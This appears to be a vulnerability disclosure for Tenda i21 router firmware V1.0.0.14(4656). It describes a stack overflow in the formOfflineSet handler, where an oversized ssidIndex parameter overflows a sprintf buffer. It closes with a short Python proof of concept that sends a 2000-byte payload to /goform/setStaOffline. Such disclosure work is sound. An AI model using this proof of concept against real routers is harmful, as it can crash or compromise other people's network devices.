## Overview

- Firmware download website: https://www.tenda.com.cn/download/detail-2982.html

## Affected version

i21 V1.0.0.14(4656)

## Patch httpd

![image-20240425204703541](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240425204703541.png)

![image-20240425204602020](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240425204602020.png)

![image-20240425204639838](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240425204639838.png)

## Vulnerability details

In the i21 V1.0.0.14(4656) firmware has a stack overflow vulnerability in the `formOfflineSet` function. The `GO, index` variable receives the `GO, ssidIndex` parameter from a POST request. However, since the user can control the input of `GO, ssidIndex`, the statement `sprintf(weburl, "%s?index=%s", GO, index);` can cause a buffer overflow. The user-provided  `GO, ssidIndex` can exceed the capacity of the `weburl` array, triggering this security vulnerability.

![image-20240419205512693](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240419205512693.png)

![image-20240419203746346](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240419203746346.png)

![image-20240419203710925](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240419203710925.png)

## POC

```python
import requests


ip = "192.168.84.101"
url = "http://" + ip + "/goform/setStaOffline"
payload = b"a"*2000

data = {"GO": "1", "ssidIndex": payload}
response = requests.post(url, data=data)
```

![image-20240419162115799](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240419162115799.png)
